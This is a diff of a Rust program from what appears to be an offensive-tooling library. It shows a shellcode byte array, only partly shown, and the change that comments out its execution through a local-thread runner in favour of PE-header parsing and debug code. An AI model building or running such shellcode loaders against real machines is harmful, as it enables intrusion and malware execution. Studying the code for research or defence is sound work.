@@ -1,4 +1,11 @@
 use oxidized_armoury::execution::thread::execute_local_thread;
+use oxidized_armoury::util::pe_headers::PeHeader;
+
+use std::thread::sleep;
+use std::time::Duration;
+use std::mem::transmute;
+
+
 fn main() {
     let buf: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -23,6 +30,15 @@ fn main() {
     ];
 
     unsafe {
-        let _ = execute_local_thread(buf.to_vec());
+        let test = PeHeader::parse().entry_point;
+        dbg!(test);
+        assert!(!test.is_null());
+        //println!("--- main fn pointer ---");
+        //let test_ptr:*const u8 = 0x00007ff665e70000 as *const u8;
+        //dbg!(test_ptr);
+        //let swag:u8 = *test_ptr;
+        //dbg!(swag);
+        sleep(Duration::from_secs(60));
+        //let _ = execute_local_thread(buf.to_vec());
     }
 }
